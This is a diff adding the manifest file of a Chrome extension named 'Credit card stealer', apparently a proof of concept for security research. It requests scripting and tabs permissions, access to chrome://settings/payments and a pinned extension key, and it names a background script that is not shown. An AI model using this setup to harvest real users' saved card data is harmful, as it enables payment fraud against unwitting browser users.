@@ -1,0 +1,17 @@
+{
+    "manifest_version": 3,
+    "name": "Credit card stealer",
+    "description": "Proof-of-Concept extension for stealing payment method information from Chromium settings using the Scripting API",
+    "version": "0.0.1",
+    "key": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDEGBi/oD7Yl/Y16w3+gee/95/EUpRZ2U6c+8orV5ei+3CRsBsoXI/DPGBauZ3rWQ47aQnfoG00sXigFdJA2NhNK9OgmRA2evnsRRbjYm2BG1twpaLsgQPPus3PyczbDCvhFu8k24wzFyEtxLrfxAGBseBPb9QrCz7B4k2QgxD/CwIDAQAB",
+    "permissions": [
+        "scripting",
+        "tabs"
+    ],
+    "host_permissions": [
+        "chrome://settings/payments"
+    ],
+    "background": {
+        "service_worker": "background.js"
+    }
+}
